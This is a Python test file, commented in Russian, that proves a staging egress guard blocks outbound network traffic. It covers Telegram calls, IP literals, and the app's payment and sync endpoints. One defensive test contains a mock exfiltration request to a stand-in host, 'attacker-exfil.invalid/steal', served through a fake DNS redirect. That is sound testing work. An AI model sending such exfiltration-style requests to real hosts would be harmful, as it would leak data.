"""Доказательство «тишины» стенда (stand_egress.py).

Каждый сценарий — отдельный субпроцесс с чистого листа: conftest.py всего
репозитория глушит сеть и подменяет get_gsheet_client для ВСЕХ тестов сразу,
и внутри обычного pytest-процесса эти подмены дали бы ложный зелёный —
guard посчитали бы работающим, даже если он не установлен вовсе. Поэтому
здесь — sys.executable -c "<script>" с боеподобными env и чтением JSON
из последней строки stdout.
"""
import json
import subprocess
import sys
import textwrap
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]

BASE_ENV = {
    'SECRET_KEY': 'test-secret-only',
    'STAND_PASSWORD': 'test-secret-only',
    'PYTHON_DOTENV_DISABLED': '1',
    'LOCAL_NO_AUTH': '0',
    'BITRIX_WEBHOOK': 'https://bitrix.invalid/rest/fake/',
    'TELEGRAM_BOT_TOKEN': '111:fake-prod-token',
    'REF_LOGIN_BOT_TOKEN': '222:fake-ref-token',
    'GOOGLE_SA_JSON': '',
    'DOVERKA_API_KEY': 'fake-doverka-key',
    'CRM_WEBHOOK_URL': 'https://webhook.invalid/deal-completed',
    'WL_BOT_URL': 'https://wl-bot.invalid',
    'WL_BOT_API_KEY': 'fake-wl-key',
    'METRIKA_TOKEN': 'fake-metrika-token',
    'STAND_TG_CHAT': '-1009999999',
    'STAND_TG_TOKEN': '333:fake-stand-token',
    'STAND_DOCPARSE_KEY': 'fake-docparse-key',
    'STAND_PROD_RO_KEY': 'fake-prod-ro-key',
    'OPENROUTER_API_KEY': 'fake-openrouter-key',
    'HTTPS_PROXY': 'http://proxy.invalid:3128',
    'STAND_TRANSFER_POLL_ENABLED': '0',
    'REESTR_SYNC_ENABLED': '0',
    'PAYMENT_POLL_ENABLED': '0',
    'PAYIN_ADDR_BACKFILL': '0',
    'TRONSCAN_WARM_ENABLED': '0',
    'KYC_RETENTION_ENABLED': '0',
}


def run_script(body, stand_mode='1', extra_env=None, timeout=30):
    """Запускает `body` (питон-код) в свежем subprocess с боеподобным env.

    `body` должен напечатать ровно один JSON-объект последней строкой stdout —
    это и есть результат сценария (см. helper OUT() внутри шаблона).
    """
    env = dict(BASE_ENV)
    if stand_mode is not None:
        env['STAND_MODE'] = stand_mode
    if extra_env:
        env.update(extra_env)
    preamble = textwrap.dedent(f'''
        import sys, os, json, tempfile
        sys.path.insert(0, {str(ROOT)!r})
        _workdir = tempfile.mkdtemp(prefix='stand-egress-test-')
        os.chdir(_workdir)
        with open('google_sa.json', 'w') as _f:
            json.dump({{'type': 'service_account', 'client_email': 'x@x.iam.gserviceaccount.com',
                       'private_key': '-----BEGIN PRIVATE KEY-----\\nfake\\n-----END PRIVATE KEY-----\\n',
                       'token_uri': 'https://oauth2.googleapis.com/token'}}, _f)
        os.environ['DATABASE_URL'] = 'sqlite:///' + _workdir + '/test.db'
        def OUT(d):
            print(json.dumps(d, default=str))
    ''')
    script = preamble + '\n' + textwrap.dedent(body)
    proc = subprocess.run([sys.executable, '-c', script], env=env,
                          capture_output=True, text=True, timeout=timeout, cwd=str(ROOT))
    last_line = ''
    for line in proc.stdout.splitlines():
        line = line.strip()
        if line:
            last_line = line
    assert last_line, (
        f'subprocess не напечатал результат.\\nSTDOUT:\\n{proc.stdout}\\nSTDERR:\\n{proc.stderr}')
    try:
        return json.loads(last_line), proc
    except json.JSONDecodeError:
        raise AssertionError(f'последняя строка stdout не JSON: {last_line!r}\\nSTDERR:\\n{proc.stderr}')


# ─────────────────────────── негативный контроль ───────────────────────────

def test_stand_mode_off_guard_not_installed():
    result, proc = run_script('''
        import stand_egress
        installed = stand_egress.install()
        import app  # noqa: F401 — прод-путь не должен падать без guard'а
        OUT({'installed': installed, 'active': stand_egress.status()['active']})
    ''', stand_mode='0')
    assert proc.returncode == 0, proc.stderr
    assert result == {'installed': False, 'active': False}


# ────────────────────────── сеть: хост важнее loopback ─────────────────────

def test_external_hostname_blocked_before_dns_redirect_to_loopback():
    """Ключевая проверка (уточнение соведущего): если внешний хост резолвится
    в локальный фейковый сервер, guard обязан отказать ДО этого резолва — по
    имени хоста, а не пропустить его как «loopback». Фейковый сервер не должен
    получить ни одного соединения, а запись блокировки — называть исходный хост."""
    result, proc = run_script('''
        import socket, threading, http.server, requests

        _real_getaddrinfo = socket.getaddrinfo
        hits = {'n': 0}

        class FakeH(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                hits['n'] += 1
                self.send_response(200); self.end_headers(); self.wfile.write(b'{}')
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), FakeH)
        fake_port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        EVIL_HOST = 'attacker-exfil.invalid'

        def fake_dns(host, port, *a, **kw):
            if host == EVIL_HOST:
                return _real_getaddrinfo('127.0.0.1', fake_port, *a, **kw)
            return _real_getaddrinfo(host, port, *a, **kw)
        socket.getaddrinfo = fake_dns  # подложили ДО install() — как это сделал бы conftest

        import stand_egress
        stand_egress.install()

        blocked = False
        try:
            requests.get(f'http://{EVIL_HOST}:80/steal', timeout=2)
        except requests.exceptions.ConnectionError:
            blocked = True

        st = stand_egress.status()
        recent_hosts = [r['where'] for r in st['recent']]
        OUT({
            'blocked': blocked,
            'fake_server_hits': hits['n'],
            'blocked_count': st['blocked_count'],
            'mentions_evil_host': any(EVIL_HOST in w for w in recent_hosts),
        })
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['blocked'] is True
    assert result['fake_server_hits'] == 0, 'фейковый сервер не должен получить соединений'
    assert result['blocked_count'] >= 1
    assert result['mentions_evil_host'] is True, 'блокировка должна называть исходное имя хоста'


def test_loopback_direct_connection_allowed():
    result, proc = run_script('''
        import socket, threading, http.server, requests
        class FakeH(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
            def log_message(self, *a): pass
        srv = http.server.HTTPServer(('127.0.0.1', 0), FakeH)
        port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()
        r = requests.get(f'http://127.0.0.1:{port}/', timeout=2)
        OUT({'status': r.status_code})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 200


def test_ip_literal_and_ipv6_blocked():
    result, proc = run_script('''
        import socket
        import stand_egress
        stand_egress.install()

        blocked_ipv4 = False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(('203.0.113.5', 80))  # TEST-NET-3, гарантированно не наш
        except Exception:
            blocked_ipv4 = True

        blocked_ipv6 = False
        try:
            s6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s6.settimeout(1)
            s6.connect(('2001:db8::1', 80))  # документационный IPv6-диапазон
        except Exception:
            blocked_ipv6 = True

        OUT({'blocked_ipv4': blocked_ipv4, 'blocked_ipv6': blocked_ipv6})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'blocked_ipv4': True, 'blocked_ipv6': True}


def test_redirect_not_followed_and_other_libs_blocked_to_telegram():
    """httpx/urllib/aiohttp к api.telegram.org — тоже отказ на сокете, не только requests."""
    result, proc = run_script('''
        import socket
        import stand_egress
        stand_egress.install()

        def blocked_with(fn):
            try:
                fn()
                return False
            except Exception:
                return True

        import requests
        r_blocked = blocked_with(lambda: requests.post(
            'https://api.telegram.org/botFAKE:TOKEN/sendMessage', json={'x': 1}, timeout=2))

        import urllib.request
        u_blocked = blocked_with(lambda: urllib.request.urlopen(
            'https://api.telegram.org/botFAKE:TOKEN/getMe', timeout=2))

        import httpx
        h_blocked = blocked_with(lambda: httpx.get(
            'https://api.telegram.org/botFAKE:TOKEN/getMe', timeout=2))

        import asyncio, aiohttp
        async def _try_aiohttp():
            async with aiohttp.ClientSession() as s:
                async with s.get('https://api.telegram.org/botFAKE:TOKEN/getMe', timeout=2) as resp:
                    await resp.read()
        a_blocked = blocked_with(lambda: asyncio.run(_try_aiohttp()))

        OUT({'requests': r_blocked, 'urllib': u_blocked, 'httpx': h_blocked, 'aiohttp': a_blocked})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'requests': True, 'urllib': True, 'httpx': True, 'aiohttp': True}


# ───────────────────────────── tg_call / can_send ──────────────────────────

def _fake_telegram_server_script():
    return '''
        import threading, http.server, json as _json

        class FakeTG(http.server.BaseHTTPRequestHandler):
            requests = []
            def do_POST(self):
                length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(length)
                FakeTG.requests.append({'path': self.path, 'body': _json.loads(body or b'{}')})
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(_json.dumps({'ok': True, 'result': {'id': 1}}).encode())
            def log_message(self, *a): pass

        _srv = http.server.HTTPServer(('127.0.0.1', 0), FakeTG)
        _tg_port = _srv.server_port
        threading.Thread(target=_srv.serve_forever, daemon=True).start()
    '''


def test_tg_call_send_message_to_allowed_chat_reaches_fake_telegram():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda channel, recipient, operation:
            operation == 'sendMessage' and recipient == 555)

        res = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'hi'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'hits': len(FakeTG.requests),
             'path': FakeTG.requests[0]['path'] if FakeTG.requests else None})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is True
    assert result['hits'] == 1
    assert result['path'].endswith('/sendMessage')


def test_tg_call_denies_wrong_chat_id_without_network():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda channel, recipient, operation:
            operation == 'sendMessage' and recipient == 555)

        res = stand_egress.tg_call('sendMessage', {'chat_id': 999, 'text': 'nope'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'error': res.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is False and result['error'] == 'denied' and result['hits'] == 0


def test_tg_call_denies_group_chat_id():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)  # даже разрешающая политика не спасает группу

        res = stand_egress.tg_call('sendMessage', {'chat_id': -1001234567890, 'text': 'group'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'error': res.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is False and result['hits'] == 0


def test_tg_call_denies_send_document_method():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)

        res = stand_egress.tg_call('sendDocument', {'chat_id': 555}, _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'error': res.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is False and result['error'] == 'method_not_allowed' and result['hits'] == 0


def test_tg_call_default_policy_allows_read_only_methods():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()  # политика не регистрируется — дефолт

        res = stand_egress.tg_call('getMe', {}, _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is True and result['hits'] == 1


# ───────────────────────────── прикладные точки выхода ─────────────────────

def test_app_scenarios_no_egress_and_correct_status_codes():
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import app

        app.app.config['TESTING'] = True
        app.limiter.enabled = False
        client = app.app.test_client()

        out = {}

        # get_gsheet_client: локальный google_sa.json лежит в cwd, но STAND_MODE
        # обязан вернуть None, не читая файл.
        out['gsheet_client_none'] = app.get_gsheet_client() is None

        # bitrix_deals._post блокируется до HTTP, даже с валидным BITRIX_WEBHOOK.
        import bitrix_deals
        try:
            bitrix_deals._post('crm.deal.list', {})
            out['bitrix_blocked'] = False
        except bitrix_deals.BitrixError as e:
            out['bitrix_blocked'] = str(e) == 'stand_blocked'

        # /api/stand/egress-status: без сессии — 401
        r = client.get('/api/stand/egress-status')
        out['egress_status_anon'] = r.status_code

        db = app.get_session()
        try:
            manager = app.AdminUser(username='mgr-test', role='manager', password_hash=b'x')
            admin = app.AdminUser(username='adm-test', role='admin', password_hash=b'x')
            db.add_all([manager, admin]); db.commit()
            mgr_id, admin_id = manager.id, admin.id
        finally:
            db.close()

        # не-admin — 403 на egress-status
        with client.session_transaction() as sess:
            sess['user_id'] = mgr_id
        out['egress_status_manager'] = client.get('/api/stand/egress-status').status_code

        # Дальше — залогинены админом: точки выхода блокируются в STAND_MODE
        # независимо от роли, авторизация тут не при чём.
        with client.session_transaction() as sess:
            sess['user_id'] = admin_id

        r = client.get('/api/stand/egress-status')
        out['egress_status_admin'] = (r.status_code, r.get_json().get('success'))

        r = client.post('/api/proxy/create-payment', json={'amount': 100, 'order_id': 'X'})
        out['create_payment'] = (r.status_code, r.get_json().get('error'))

        r = client.post('/api/docs/parse', data={'deal_type': 'rental'},
                        content_type='multipart/form-data')
        out['docs_parse'] = (r.status_code, r.get_json().get('error'))

        r = client.get('/api/rates')
        out['rates'] = (r.status_code, r.get_json().get('stand_blocked'))

        r = client.post('/api/reestr/sync')
        out['reestr_sync'] = (r.status_code, r.get_json().get('error'))

        r = client.post('/api/stand/prod-agents')
        out['prod_agents'] = (r.status_code, r.get_json().get('error'))

        OUT(out)
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['gsheet_client_none'] is True
    assert result['bitrix_blocked'] is True
    assert result['create_payment'] == [403, 'stand_blocked']
    assert result['docs_parse'] == [403, 'stand_blocked']
    assert result['rates'] == [200, True]
    assert result['reestr_sync'] == [403, 'stand_blocked']
    assert result['prod_agents'] == [403, 'stand_blocked']
    assert result['egress_status_anon'] == 401
    assert result['egress_status_manager'] == 403
    assert result['egress_status_admin'] == [200, True]
